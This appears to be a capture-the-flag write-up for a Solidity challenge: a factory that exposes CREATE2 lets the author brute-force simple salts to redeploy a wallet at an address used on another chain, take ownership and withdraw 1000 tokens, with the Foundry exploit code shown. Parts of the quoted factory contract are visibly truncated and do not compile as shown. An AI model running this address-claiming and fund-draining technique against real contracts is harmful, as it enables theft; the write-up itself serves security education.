## Challenge

This challenge is once again focused on the create2 operator. We are provided with a standard ERC20 and 2 other contracts. Of those one is the template of a wallet that the company also used on the other cha√≠n (not that interesting) and the deployment contract(mildly interesting). To keep it simple I just added the deployment contract as the others are not needed for the solution, the token has standard functionalities and the only interesting thing about the wallet is that you can use it to store/send ERC20 tokens if you are the owner. 

### Vaultfactory.sol

The VaultFactory has the interesting functionality that you can provide it with any bytecode and salt, and it will deploy it. It pretty much is a wrapper for a CREATE2 call.

    function deploy(bytes memory code, uint256 salt) public returns (address addr) {
        assembly {
            addr := create2(     // Deploys a contract using create2.
                0,               // wei sent with current call
                add(code, 0x20), // Pointer to code, with skip the assembly prefix

            if iszero(extcodesize(addr)) { revert(0, 0) } // Check if contract deployed correctly, otherwise revert.
        }
        emit Deployed(addr);
    }

    function callWallet(address addr, bytes memory data) public {

            let result := call(  // Performs a low level call to a contract
                gas(),           // Forward all gas to the call
                addr,            // The address of the contract to call
                0,               // wei passed to the call
                add(data, 0x20), // Pointer to data, with skip the assembly prefix
                mload(data),     // Length of data
                0,               // Pointer to output, we don't use it
                0                // Size of output, we don't use it
            )
            let size := returndatasize() // Get the size of the output
            let ptr := mload(0x40)       // Get a free memory pointer
            returndatacopy(ptr, 0, size) // Copy the output to the pointer
            switch result                 // Check the result:
            case 0 { revert(ptr, size) }  // If failed, revert with the output
            default { return(ptr, size) } // If success, return the output
        }
    }
}

```

## Solution

As we know that the address is already a wallet on a different EVM chain we know that it must be one of the possible 2 to the power of 256  outcomes(dependent on the salt) outcomes of create2 with the wallet's bytecode. As we know the bytecode of the wallet contract, we can just brute force through CREATE2 to see which salt generates a wallet at the given address. In reality, this isn't doable, as 2 to the power of 256 computations on the EVM will never work. But in this case, it works as it seems that the person that generated their wallet there, picked a very simple salt. So I just implemented this in the foundry testcase and only needed 11 computations to find the address. Then I just used the wallet functions to send back all the money to the devs and the challenge is solved.

```solidity
//This is inefficient AF Don't try this at home kids
bool success = false;
uint256 saltyMcSaltface = 0;
address payable newWallet;

//Get the bytecode of the wallet template
bytes memory code = type(VaultWalletTemplate).creationCode;

//Generate new wallets until the address matches the unclaimed address
while (!success)
{
    newWallet = payable(FACTORY.deploy(code, saltyMcSaltface));
    success = newWallet == unclaimedAddress;
    saltyMcSaltface += 1;
}

//Initialize the wallet
VaultWalletTemplate walletWeWant = VaultWalletTemplate(newWallet);
walletWeWant.initialize(whitehat);

//Withdraw the funds to the devs
walletWeWant.withdrawERC20(address(POSI), 1000 ether, devs);
```
